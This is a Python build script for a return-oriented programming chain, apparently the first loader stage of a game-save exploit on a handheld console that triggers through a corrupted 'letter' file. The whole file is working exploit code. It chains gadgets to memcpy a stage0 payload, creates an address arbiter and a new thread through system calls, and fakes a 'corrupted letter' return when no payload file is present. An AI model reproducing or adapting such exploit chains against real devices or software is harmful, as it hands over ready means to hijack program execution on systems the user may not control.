from constants import *
import os
include("macros.py")
###THIS ROP IS THREAD BASE STACK ADDRESS AGNOSTIC
###THUS IT CAN RUN WHENEVER THE ROP IS LAUNCHED, WHATEVER THE THREAD BASE STACK ADDRSS IS

set_mem_offset(LOADER_OFFSET)
VALID_ADDRESS = HEAP_STAHED_DEST # we need a valid address to store result of createThread (unused)
                                 # this location is used for jumping to stage0, it is unused after stage0 is reached
STACK_BASE = HEAP_STAHED_DEST - 0x4 # we need a safe location to store the stack base address
LOADER_ARBITER_HANDLE = 0xfff0000

put_label("start")
begin_area(PARSE_LETTER_STACK_RETURN_OFFSET-4-LOADER_OFFSET)

"""
mov_r11_to_r0() # get an address that depends on the stack base address, so we can compute the current thread stack base address
add_r0(0x100000000 - R11_THREAD_BASE_ADDRESS_OFFSET) # sub 0xa08 to get the current thread base stack address
store_r0(STACK_BASE) # store the current stack base address to a safe location
"""

mov_r9_to_r0()
SET_LR(NOP)
add_r0(0x24 + loader_size-start)
mov_r0_to_r1()
pop(r0=STAGE0_DEST, r2=os.path.getsize('build/rop_stage0.bin'))
add_word(MEMCPY)

store(0x1, LOADER_ARBITER_HANDLE+0x8)

SET_LR(NOP)
pop(r0=LOADER_ARBITER_HANDLE)
add_word(SVC_CREATE_ADDRESS_ARBITER)

# Create new thread for stage0
SET_LR(POP_R4R5PC) # skip the two args after create_thread
pop(r0=VALID_ADDRESS, r3=STAGE0_DEST) # r0=valid address to store unused value
                                      # r3=thread stack pointer
                                      # r1=thread entrypoint, no need to set r1 here since SET_LR already does that
add_word(SVC_CREATE_THREAD)
add_word(0x31) # thread priority
add_word(0xFFFFFFFE) # -2 => execute thread on the default CPU

SET_LR(NOP)
deref_to_r0(LOADER_ARBITER_HANDLE)
pop(r1=LOADER_ARBITER_HANDLE+0x4, r2=0x1, r3=0x1, r4=0x0, r5=0x0)
add_word(SVC_ARBITRATE_ADDRESS) #wait for stage0 to signal
garbage(2)


end_area()
put_label("end")

#this should be executed only if the rop file is not found on the SD card
#it basically increases the stack pointer until the args of the parse function are reached in the stack
#then it jumps to the return instrcutions of the parse function (mov r0, #0 and pop {...})
#thus this simulates a return false and the game displays a message saying the letter is corrupted
fill(PARSE_LETTER_STACK_RETURN_OFFSET-4-end, NOP, 4) #execute NOP until SP is 4 bytes before the parse function args
add_word(PARSE_RETURN) #return instructions of the parse function

put_label("loader_size")
